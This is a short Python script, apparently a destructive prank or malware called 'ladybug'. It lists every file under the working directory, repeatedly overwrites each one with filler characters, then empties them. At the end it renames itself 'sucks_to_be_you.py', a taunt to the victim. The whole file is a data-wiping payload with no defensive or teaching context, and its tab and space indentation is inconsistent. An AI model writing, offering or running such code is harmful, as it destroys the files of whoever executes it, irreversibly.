# imports 
import os

	# maps the entire computer
def create_file_list():
	file_list = []
	file = os.getcwd()
	folder = os.walk(os.getcwd())
	lenth = len(os.getcwd())
	for file in folder:
	    for i in range(len(file[2])):
	        y = file[0] +"/" + file[2][i]
	        y = y[lenth:]
	        if  y[0] == "/":
	            y = y[1:]
	            file_list.append(y)
	return file_list
	
def ladybug(x):
    times = 10
    for z in range(len(x)):
	    file_size = float(os.stat(x[z]).st_size)
	    byte = int(file_size / 4)  # number of bytes a character is 
	    for over in range(times):
	        f = open(x[z], 'w')
	        for char in range(byte):
	            f.write("a")
    	    f.close()
	    f = open(x[z], 'w')
	    f.close()

if __name__ == "__main__":
	x = create_file_list()	
	ladybug(x)
	os.renames("ladybug.py", "sucks_to_be_you.py")